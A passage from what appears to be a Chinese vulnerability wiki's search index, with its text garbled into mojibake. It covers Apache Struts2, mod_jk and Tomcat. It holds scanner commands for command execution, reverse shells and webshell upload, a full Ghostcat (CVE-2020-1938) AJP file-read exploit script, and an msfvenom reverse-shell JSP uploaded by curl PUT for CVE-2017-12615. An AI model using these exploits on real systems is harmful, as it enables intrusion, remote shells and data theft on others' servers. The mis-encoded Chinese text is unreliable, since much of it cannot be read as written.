é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-devMode:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell å•ä¸ªURLæ¼æ´æ£€æµ‹: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] æ­£åœ¨æ‰«æURL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-046 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-016 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-045 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-015 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-009 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-012 æ‰¹é‡æ¼æ´æ£€æµ‹: $ python3 Struts2Scan.py -f urls.txt POSTæ•°æ®: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp} æŒ‡å®šæ¼æ´åç§°åˆ©ç”¨: # å‘½ä»¤æ‰§è¡Œ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # åå¼¹shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] è¯·åœ¨åå¼¹åœ°å€å¤„ç›‘å¬ç«¯å£å¦‚: nc -lvvp 8080 # è·å–WEBè·¯å¾„ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # ä¸Šä¼ shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] æ–‡ä»¶ä¸Šä¼ æˆåŠŸ! å…³äº å› éƒ¨åˆ†åŸå› ï¼ŒåŸä½œè€…å…³é—­æ¼æ´åˆ©ç”¨ï¼Œå¦‚éœ€åˆ©ç”¨å¯åˆ é™¤ä»¥ä¸‹ä»£ç ä½¿ç”¨ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Exphub-Strtus2.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Exphub-Strtus2.html","title":"æ‰«æå·¥å…· Exphub-Strtus2","keywords":"","body":"About Apache Struts2 Pythonè„šæœ¬æ”¾åœ¨å½“å‰ç›®å½•çš„POCæ–‡ä»¶å¤¹ä¸­ Vulnerability list struts2-032_cmd.py Struts2 method ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´GetShellåˆ©ç”¨è„šæœ¬(CVE-2016-3081)struts2-032_poc.py Struts2 method ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´æ£€æµ‹è„šæœ¬(CVE-2016-3081)struts2-045_cmd.py Struts2 Jakarta Multipart parser æ’ä»¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬1(CVE-2017-5638)[ä½¿ç”¨]struts2-045-2_cmd.py Struts2 Jakarta Multipart parser æ’ä»¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬2(CVE-2017-5638)[ä½¿ç”¨]struts2-052_cmd.py Struts2 REST æ’ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬(CVE-2017-9805)struts2-052_webshell.py Struts2 REST æ’ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ä¸Šä¼ Webshellè„šæœ¬(CVE-2017-9805)struts2-053_cmd.py Struts2 Freemarker æ ‡ç­¾è¿œç¨‹æ‰§è¡Œå‘½ä»¤æ¼æ´åˆ©ç”¨è„šæœ¬(CVE-2017-12611)struts2-057_cmd.py Struts2 Namespace è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬(CVE-2018-11776) Readme éƒ¨åˆ†è„šæœ¬æ–‡ä»¶ä½¿ç”¨è¯´æ˜ï¼Œè¯¦ç»†ä½¿ç”¨åˆ†æè¯·å‚è€ƒvulnerability-listä¸­çš„[ä½¿ç”¨] VER: æ¼æ´å½±å“ç‰ˆæœ¬ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸åœ¨å½±å“èŒƒå›´çš„ç‰ˆæœ¬æ²¡æœ‰ç›¸å…³æ¼æ´ USE: è„šæœ¬æ–‡ä»¶ä½¿ç”¨è¯´æ˜ï¼Œå¤§éƒ¨åˆ†å†™åœ¨äº†è„šæœ¬é‡Œï¼Œæ‰§è¡Œå³å¯è§ EXP: è„šæœ¬åˆ©ç”¨ç¤ºä¾‹ï¼Œä»¥åŠæ‰§è¡Œæ•ˆæœ DES: éƒ¨åˆ†ç‰¹æ®Šè„šæœ¬æ–‡ä»¶çš„ç‰¹æ®Šæè¿° å‚è€ƒæ¥æº ExpHub WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/","title":"Apache Mod_jk","keywords":"","body":"Apache Mod_jk Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759.html","title":"Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759","keywords":"","body":"Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759 æ¼æ´æè¿° Apache Tomcat JKï¼ˆmod_jkï¼‰Connectoræ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾ä¸ºApacheæˆ–IISæä¾›è¿æ¥åå°Tomcatçš„æ¨¡å—ï¼Œç”¨ä»¥ä¸ºApacheæˆ–IISæœåŠ¡å™¨æä¾›å¤„ç†JSP/Servletçš„èƒ½åŠ›ã€‚ ç”±äºhttpdå’ŒTomcatåœ¨è·¯å¾„å¤„ç†è§„èŒƒä¸Šå­˜åœ¨å·®å¼‚ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡Apache mod_jk Connector 1.2.0ç‰ˆæœ¬åˆ°1.2.44ç‰ˆæœ¬ä¸Šç”±JkMount httpdæŒ‡ä»¤æ‰€å®šä¹‰ç«¯ç‚¹çš„è®¿é—®æ§åˆ¶é™åˆ¶ã€‚ å¦‚æœä¸€ä¸ªåªæœ‰åªè¯»æƒé™çš„jkstatusçš„æ¥å£å¯ä»¥è®¿é—®çš„è¯ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½èƒ½å¤Ÿå…¬å¼€ç”±mod_jkæ¨¡å—ç»™AJPæä¾›æœåŠ¡çš„å†…éƒ¨è·¯ç”±ã€‚ å¦‚æœä¸€ä¸ªå…·æœ‰è¯»å†™æƒé™çš„jkstatusæ¥å£å¯ä¾›è®¿é—®ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡ä¿®æ”¹AJPçš„é…ç½®æ–‡ä»¶ä¸­ç›¸å…³é…ç½®æ¥åŠ«æŒæˆ–è€…æˆªæ–­æ‰€æœ‰ç»è¿‡mod_jkçš„æµé‡ï¼Œåˆæˆ–è€…è¿›è¡Œå†…éƒ¨çš„ç«¯å£æ‰«æã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44 ç¯å¢ƒæ­å»º git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d è®¿é—® http://xxx.xxx.xxx.xxx:80 æˆåŠŸå³å¯ æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx/jkstatus æ˜¾ç¤ºæ— æƒé™è®¿é—® Forbidden You don't have permission to access /jkstatus on this server. è®¿é—® http://xxx.xxx.xxx.xxx/jkstatus; å³å¯ç»•è¿‡ [!NOTE] æ³¨æ„æ˜¯åœ¨urlåé¢åŠ ä¸Šäº†ä¸€ä¸ª; WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/","title":"Apache Tomcat","keywords":"","body":"Apache Tomcat Aapache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615 Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938.html","title":"Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938","keywords":"","body":"Aapache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 æ¼æ´æè¿° Java æ˜¯ç›®å‰ Web å¼€å‘ä¸­æœ€ä¸»æµçš„ç¼–ç¨‹è¯­è¨€ï¼Œè€Œ Tomcat æ˜¯å½“å‰æœ€æµè¡Œçš„ Java ä¸­é—´ä»¶æœåŠ¡å™¨ä¹‹ä¸€ï¼Œä»åˆç‰ˆå‘å¸ƒåˆ°ç°åœ¨å·²ç»æœ‰äºŒåå¤šå¹´å†å²ï¼Œåœ¨ä¸–ç•ŒèŒƒå›´å†…å¹¿æ³›ä½¿ç”¨ã€‚ Ghostcatï¼ˆå¹½çµçŒ«ï¼‰ æ˜¯ç”±é•¿äº­ç§‘æŠ€å®‰å…¨ç ”ç©¶å‘˜å‘ç°çš„å­˜åœ¨äº Tomcat ä¸­çš„å®‰å…¨æ¼æ´ï¼Œç”±äº Tomcat AJP åè®®è®¾è®¡ä¸Šå­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…é€šè¿‡ Tomcat AJP Connector å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œä¾‹å¦‚å¯ä»¥è¯»å– webapp é…ç½®æ–‡ä»¶æˆ–æºä»£ç ã€‚æ­¤å¤–åœ¨ç›®æ ‡åº”ç”¨æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼Œé…åˆæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨è¿˜å¯ä»¥è¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„å±å®³ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Tomcat 6 Apache Tomcat 7 Apache Tomcat 8 Apache Tomcat 9 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° ç›®å‰æœ‰å¯é çš„åˆ©ç”¨è„šæœ¬ Gihubå·¥å…·ä¸‹è½½é“¾æ¥ python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] è„šæœ¬éœ€è¦ä½¿ç”¨python2æ¥è¿è¡Œï¼Œæ­¤æ¼æ´ç”¨äºä¸Šä¼ è·¯å¾„å¯æ§ï¼Œå¼€æ”¾8009ç«¯å£AJPåè®®æƒ…å†µä¸‹é€šè¿‡è¯»å–æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ æ¼æ´åˆ©ç”¨POC https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r import socket def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() t = Tomcat(args.target, args.port) _,data = t.perform_request('/asdf',attributes=[ {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) print('----------------------------') print(\"\".join([d.data for d in data])) å‚è€ƒæ–‡ç«  Githubåœ°å€ å¨èƒé€šå‘Š APACHE TOMCAT æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2020-1938ï¼‰ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615.html","title":"Apache Tomc at è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615","keywords":"","body":"Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615 æ¼æ´æè¿° 2017å¹´9æœˆ19æ—¥ï¼ŒApache Tomcatå®˜æ–¹ç¡®è®¤å¹¶ä¿®å¤äº†ä¸¤ä¸ªé«˜å±æ¼æ´ï¼Œå…¶ä¸­å°±æœ‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2017-12615)ã€‚å½“ å¯ç”¨äº†HTTP PUTè¯·æ±‚æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œå°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼‰ï¼Œæ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ”»å‡»è¯·æ±‚æ•°æ®åŒ…å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„ JSP æ–‡ä»¶ï¼ŒJSPæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚å¯¼è‡´æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ³„éœ²æˆ–è·å–æœåŠ¡å™¨æƒé™ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Tomcat 7.0.0 - 7.0.81 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æ¼æ´äº§ç”Ÿçš„ä¸»è¦åŸå› æ¥è‡ªäºconf/web.xmlæ–‡ä»¶é…ç½®é”™è¯¯,readonlyå¼€å¯äº†false,å¯¼è‡´å¯ä»¥ä½¿ç”¨PUT/DELETEè¯·æ±‚æ–¹æ³•æ“ä½œæ–‡ä»¶ msfç”Ÿæˆä¸€ä¸ªjspæœ¨é©¬ msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp åˆ©ç”¨PUTæ–¹æ³•ä¸Šä¼ æœ¨é©¬ curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] æ³¨æ„ http://xxx.xxx.xxx.xxx:8080/shell.jsp/ä¸­çš„æœ€åä¸€ä¸ª\"/\"å­—ç¬¦å¾ˆé‡è¦ å‘ç°æˆåŠŸä¸Šä¼ æœ¨é©¬æ–‡ä»¶ è®¿é—®æ–‡ä»¶å³å¯åå¼¹ä¸€ä¸ªshell ä¹Ÿå¯ä»¥ä½¿ç”¨DELETEè¯·æ±‚æ–¹æ³•åˆ 